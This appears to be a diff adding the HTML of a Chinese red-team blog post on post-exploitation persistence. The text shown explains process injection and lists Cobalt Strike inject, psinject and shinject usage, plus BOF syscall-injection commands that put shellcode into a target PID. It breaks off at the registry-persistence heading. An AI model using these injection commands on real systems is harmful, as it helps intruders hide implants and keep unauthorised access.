@@ -1,0 +1,1296 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>内网渗透-权限维持 - N1Rvana&#39;s Blog</title><meta name="author" content="N1Rvana">
+<meta name="description" content="Web Security"><meta name="keywords" content='权限维持'>
+  <meta itemprop="name" content="内网渗透-权限维持">
+  <meta itemprop="description" content="Web Security">
+  <meta itemprop="datePublished" content="2025-03-18T23:11:39+08:00">
+  <meta itemprop="dateModified" content="2025-03-18T23:11:39+08:00">
+  <meta itemprop="wordCount" content="7319">
+  <meta itemprop="image" content="https://nlrvana.github.io/avatar.png">
+  <meta itemprop="keywords" content="权限维持"><meta property="og:url" content="https://nlrvana.github.io/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">
+  <meta property="og:site_name" content="N1Rvana&#39;s Blog">
+  <meta property="og:title" content="内网渗透-权限维持">
+  <meta property="og:description" content="Web Security">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-18T23:11:39+08:00">
+    <meta property="article:modified_time" content="2025-03-18T23:11:39+08:00">
+    <meta property="article:tag" content="权限维持">
+    <meta property="og:image" content="https://nlrvana.github.io/avatar.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://nlrvana.github.io/avatar.png">
+  <meta name="twitter:title" content="内网渗透-权限维持">
+  <meta name="twitter:description" content="Web Security">
+      <meta name="twitter:site" content="@huahua39079406">
+<meta name="twitter:creator" content="@huahua39079406" /><meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://nlrvana.github.io/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="内网渗透-权限维持 - N1Rvana&#39;s Blog" /><link rel="prev" type="text/html" href="https://nlrvana.github.io/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/" title="内网渗透-隧道搭建" /><link rel="alternate" type="text/markdown" href="https://nlrvana.github.io/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/index.md" title="内网渗透-权限维持 - N1Rvana's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "内网渗透-权限维持",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/nlrvana.github.io\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81\/"
+    },"genre": "posts","keywords": "权限维持","wordcount":  7319 ,
+    "url": "https:\/\/nlrvana.github.io\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81\/","datePublished": "2025-03-18T23:11:39+08:00","dateModified": "2025-03-18T23:11:39+08:00","license": "Web Security","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "N1Rvana"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item has-children">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="关键词搜索" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="关键词搜索" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><span class="nested-item">
+                  <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a>
+                  <i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden="true"></i>
+                </span>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item" data-separator="/"><a href="/" title="N1Rvana&#39;s Blog">Home</a></li><li class="breadcrumb-item" data-separator="/"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" data-separator="/" aria-current="page">内网渗透-权限维持</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>内网渗透-权限维持</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/avatar.png" alt="N1Rvana" data-title="N1Rvana" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;N1Rvana</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category" title="Category - 内网渗透"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 内网渗透</a></span></div><div class="post-meta-line"><span title="published on 2025-03-18 23:11:39"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-03-18">2025-03-18</time></span>&nbsp;<span title="7319 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 7400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>15 minutes</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="内网渗透-权限维持"><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_page_pv">-</span>&nbsp;views
+          </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#权限维持-进程迁移">权限维持-进程迁移</a>
+      <ul>
+        <li><a href="#什么是进程迁移">什么是进程迁移</a></li>
+        <li><a href="#使用进程迁移的目的">使用进程迁移的目的</a></li>
+        <li><a href="#使用进程迁移的场景">使用进程迁移的场景</a></li>
+        <li><a href="#cobaltstrike中的进程迁移">CobaltStrike中的进程迁移</a></li>
+        <li><a href="#bof实现的进程注入">bof实现的进程注入</a>
+          <ul>
+            <li><a href="#staticsyscallsinject">StaticSyscallsInject</a></li>
+            <li><a href="#syscallsinject">SyscallsInject</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#权限维持-修改注册表实现自启动">权限维持-修改注册表实现自启动</a>
+      <ul>
+        <li><a href="#注册表简介">注册表简介</a></li>
+        <li><a href="#注册表组成">注册表组成</a></li>
+        <li><a href="#五大根键">五大根键</a></li>
+        <li><a href="#实现原理">实现原理</a></li>
+        <li><a href="#命令行下的使用">命令行下的使用</a></li>
+      </ul>
+    </li>
+    <li><a href="#权限维持-注册服务自启">权限维持-注册服务自启</a>
+      <ul>
+        <li><a href="#什么是系统服务">什么是系统服务</a></li>
+        <li><a href="#系统服务的作用">系统服务的作用</a></li>
+        <li><a href="#命令行下创建服务">命令行下创建服务</a></li>
+        <li><a href="#powershell创建服务">PowerShell创建服务</a></li>
+        <li><a href="#sharpersist-创建服务">SharPersist 创建服务</a></li>
+      </ul>
+    </li>
+    <li><a href="#权限维持-计划任务">权限维持-计划任务</a>
+      <ul>
+        <li><a href="#计划任务简介">计划任务简介</a></li>
+        <li><a href="#schtasks简介">schtasks简介</a></li>
+        <li><a href="#schtasks的使用">schtasks的使用</a></li>
+        <li><a href="#sharpersist使用">SharPersist使用</a></li>
+      </ul>
+    </li>
+    <li><a href="#权限维持-隐蔽账号和启动">权限维持-隐蔽账号和启动</a>
+      <ul>
+        <li><a href="#启动目录"><strong>启动目录</strong></a></li>
+        <li><a href="#创建隐蔽账号">创建隐蔽账号</a></li>
+      </ul>
+    </li>
+    <li><a href="#权限维持-cs相关插件">权限维持-CS相关插件</a>
+      <ul>
+        <li><a href="#sharpersist">SharPersist</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="权限维持-进程迁移" class="heading-element"><span>权限维持-进程迁移</span>
+  <a href="#%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81-%e8%bf%9b%e7%a8%8b%e8%bf%81%e7%a7%bb" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="什么是进程迁移" class="heading-element"><span>什么是进程迁移</span>
+  <a href="#%e4%bb%80%e4%b9%88%e6%98%af%e8%bf%9b%e7%a8%8b%e8%bf%81%e7%a7%bb" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>进程迁移（进程注入），是说当一个程序运行时本身没有一个独立的进程，而是通过相关技术把功能注入到某一个正在运行的进程当中，使运行的进程在进程列表当中无法查看到，这样就起到了利用已存在的进程来隐藏自身进程的作用，并且在权限维持的角度而言也起到了一定的作用。<br>
+进程注入是一种广泛使用的躲避检测的技术，通常用于恶意软件或者无文件技术。其需要在另一个进程的地址空间内运行特质代码，进程注入改善了不可见性，同时一些技术也实现了持久性。<br>
+大体上，进程注入可以分为两种形式</p>
+<ul>
+<li>DLL注入</li>
+<li>Shellcode注入<br>
+这两种方式没有本质上的区别，在操作系统层面，dll也是shellcode汇编代码。为了开发方便，经常会将代码以dll的形式编译并传播，在实际注入的时候，由注入方或者被注入方调用loadlibrary加载</li>
+</ul>
+<h3 id="使用进程迁移的目的" class="heading-element"><span>使用进程迁移的目的</span>
+  <a href="#%e4%bd%bf%e7%94%a8%e8%bf%9b%e7%a8%8b%e8%bf%81%e7%a7%bb%e7%9a%84%e7%9b%ae%e7%9a%84" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><ul>
+<li>隐藏进程</li>
+<li>权限维持</li>
+</ul>
+<h3 id="使用进程迁移的场景" class="heading-element"><span>使用进程迁移的场景</span>
+  <a href="#%e4%bd%bf%e7%94%a8%e8%bf%9b%e7%a8%8b%e8%bf%81%e7%a7%bb%e7%9a%84%e5%9c%ba%e6%99%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>在权限维持的角度来说，使用进程迁移最多的场景时windows server系列，因为服务器不会经常重启，所以，在某类需求的实战场景中也是使用最频繁最方便的一种方式。对于pc机的权限维持需求不太使用，pc机的重启率太高。</p>
+<h3 id="cobaltstrike中的进程迁移" class="heading-element"><span>CobaltStrike中的进程迁移</span>
+  <a href="#cobaltstrike%e4%b8%ad%e7%9a%84%e8%bf%9b%e7%a8%8b%e8%bf%81%e7%a7%bb" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>名词说明：Post-Exploitation Jobs(进程执行+远程注入)<br>
+<code>inject</code>和<code>shinject</code>命令可以将代码注入到任意远程进程中，该工具一些内置的Post-Exploitation job也会针对特定的远程进程。<br>
+<strong>cs使用</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">beacon&gt; help inject  
+</span></span><span class="line"><span class="cl">Use: inject [pid] &lt;x86|x64&gt; [监听器]  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">打开 [pid] 指定的进程并注入运行从 [监听器] 生成的shellcode  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>psinject</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">psinject时cs4</span><span class="o">.</span><span class="mi">0</span><span class="o">+</span><span class="err">版本才出现的，使用的是</span><span class="n">one</span><span class="o">-</span><span class="n">liner</span> <span class="n">payload注入进程</span>  
+</span></span><span class="line"><span class="cl"><span class="err">它向特定进程中注入非托管</span><span class="n">PowerShell并通过其执行指定的命令</span>  
+</span></span><span class="line"><span class="cl"><span class="err">对于</span><span class="n">psinject</span><span class="err">、</span><span class="n">x64进程可以注入x86</span><span class="o">/</span><span class="n">x64的payload</span><span class="err">、</span><span class="n">x86进程只能注入x86</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="n">beacon</span><span class="o">&gt;</span> <span class="n">help</span> <span class="n">psinject</span>  
+</span></span><span class="line"><span class="cl"><span class="n">Use</span><span class="p">:</span> <span class="n">psinject</span> <span class="p">[</span><span class="n">pid</span><span class="p">]</span> <span class="p">[</span><span class="n">x86</span><span class="o">|</span><span class="n">x64</span><span class="p">]</span> <span class="p">[</span><span class="n">cmdlet</span><span class="p">]</span> <span class="p">[</span><span class="err">参数</span><span class="p">]</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="err">注入非托管</span><span class="n">Powershell到</span> <span class="p">[</span><span class="n">pid</span><span class="p">]</span> <span class="err">指定的进程中，然后执行</span> <span class="p">[</span><span class="n">cmdlect</span><span class="p">]</span><span class="err">，不会调用</span><span class="n">powershell</span><span class="o">.</span><span class="n">exe</span>  
+</span></span><span class="line"><span class="cl"><span class="err">最后一次使用</span><span class="n">powershell</span><span class="o">-</span><span class="n">import导入的任何cmdlet也可以在这里使用</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>shinject</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">beacon&gt; help shinject  
+</span></span><span class="line"><span class="cl">Use: shinject [pid] &lt;x86|x64&gt; [/本地绝对路径/my.bin]  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">打开 [pid] 指定的进程并注入运行本地shellcode文件  </span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="bof实现的进程注入" class="heading-element"><span>bof实现的进程注入</span>
+  <a href="#bof%e5%ae%9e%e7%8e%b0%e7%9a%84%e8%bf%9b%e7%a8%8b%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="staticsyscallsinject" class="heading-element"><span>StaticSyscallsInject</span>
+  <a href="#staticsyscallsinject" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>(64-bit only)<br>
+Beacon object file to:</p>
+<ul>
+<li>Inject shellcode(either custom or beacon)into remote process using NtOpenProcess-&gt;NtAllocateVirtualMemory-&gt;NtWriterVirtualMemory-&gt;NtCreateThreadEx<br>
+使用方法</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1、static_syscalls_shinjet 4052 /path/to/my.bin  
+</span></span><span class="line"><span class="cl">2、static_syscalls_inject 4972 http(监听器名称)  </span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="syscallsinject" class="heading-element"><span>SyscallsInject</span>
+  <a href="#syscallsinject" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>使用方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1、syscalls_shinject 4052 /path/to/my.bin  
+</span></span><span class="line"><span class="cl">2、syscalls_inject 4972 http(监听器名称)  </span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="权限维持-修改注册表实现自启动" class="heading-element"><span>权限维持-修改注册表实现自启动</span>
+  <a href="#%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81-%e4%bf%ae%e6%94%b9%e6%b3%a8%e5%86%8c%e8%a1%a8%e5%ae%9e%e7%8e%b0%e8%87%aa%e5%90%af%e5%8a%a8" class="heading-mark">
